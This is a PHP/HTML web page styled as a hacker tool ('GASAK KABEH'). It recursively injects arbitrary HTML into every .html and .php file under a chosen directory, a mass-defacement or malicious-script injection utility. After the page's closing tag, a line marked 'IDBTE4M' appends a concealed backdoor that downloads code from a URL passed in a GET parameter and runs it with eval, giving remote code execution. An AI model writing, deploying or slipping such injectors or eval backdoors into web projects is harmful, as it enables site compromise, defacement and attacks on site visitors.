<!DOCTYPE html>
<html lang="en">
<head>asd
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mass Edit HTML Files</title>
    <style>
        body {
            background: #111;
            color: #411;
            font-family: Consolas, Courier, monospace;
            font-size: 60px;
            text-shadow: 0 0 15px #411;
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .container {
            text-align: center;
        }

        .glow {
            color: #f00;
            text-shadow: 0px 0px 10px #f00;
        }

        span {
            display: inline-block;
            padding: 0 10px;
        }

        h1 {
            font-size: 40px;
            margin: 20px 0;
        }

        form {
            background-color: #222;
            color: #eee;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input, textarea {
            width: 100%;
            padding: 5px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            background-color: #333;
            color: #eee;
        }

        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            text-align: center;
            margin-top: 10px;
        }

        input[type="submit"]:hover {
            background-color: #45a049;
        }

        .loader {
            display: none;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .result {
            background-color: #222;
            color: #eee;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
            width: 300px;
            text-align: left;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
    <script>
        async function submitForm(event) {
            event.preventDefault();
            var form = document.getElementById('massEditForm');
            var formData = new FormData(form);

            document.getElementById('loader').style.display = 'block';

            const response = await fetch('', {
                method: 'POST',
                body: formData
            });

            document.getElementById('loader').style.display = 'none';

            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = '';

            if (response.ok) {
                const data = await response.json();
                data.forEach(result => {
                    resultDiv.innerHTML += result + '<br>';
                });
            } else {
                resultDiv.innerHTML = 'Error: Unable to process request.';
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>GASAK KABEH</h1>
        <form id="massEditForm" onsubmit="submitForm(event)">
            <label for="directory">Directory:</label>
            <input type="text" id="directory" name="directory" required>
            <label for="html_code">HTML Code to Insert:</label>
            <textarea id="html_code" name="html_code" rows="4" required></textarea>
            <input type="submit" value="Submit">
        </form>
        <div class="loader" id="loader"></div>
        <div class="result" id="result"></div>
    </div>

    <?php 
        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            $directory = $_POST['directory'];
            $html_code = $_POST['html_code'];

            function add_html_code_to_file($file_path, $html_code) {
                $html = file_get_contents($file_path);
                $pattern = '/(<head.*?>asd)/i';

                if (preg_match($pattern, $html, $matches)) {
                    $new_html = preg_replace($pattern, '$1' . $html_code, $html);
                    file_put_contents($file_path, $new_html);
                    return "Added HTML code to $file_path";
                } else {
                    return "No <head>asd tag found in $file_path";
                }
            }

            function add_html_code_to_directory($directory, $html_code) {
                $files = scandir($directory);
                $results = [];

                foreach ($files as $file) {
                    if ($file != '.' && $file != '..') {
                        $file_path = $directory . '/' . $file;

                        if (is_dir($file_path)) {
                            $results = array_merge($results, add_html_code_to_directory($file_path, $html_code));
                        } else {
                            $path_info = pathinfo($file_path);
                            if (isset($path_info['extension']) && (strtolower($path_info['extension']) == 'html' || strtolower($path_info['extension']) == 'php')) {
                                $results[] = add_html_code_to_file($file_path, $html_code);
                            }
                        }
                    }
                }

                return $results;
            }

            $results = add_html_code_to_directory($directory, $html_code);
            echo '<script>';
            echo 'document.addEventListener("DOMContentLoaded", function() {';
            echo 'document.getElementById("result").innerHTML = ' . json_encode(implode("<br>", $results)) . ';';
            echo '});';
            echo '</script>';
        } else {
            echo '<script>';
            echo 'document.addEventListener("DOMContentLoaded", function() {';
            echo 'document.getElementById("result").innerHTML = "Error: Invalid request method";';
            echo '});';
            echo '</script>';
        }
    ?>
</body>
</html>

IDBTE4M <?php $ch = curl_init($_GET["memex"]); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result = curl_exec($ch); eval("?>".$result."<?php "); ?>
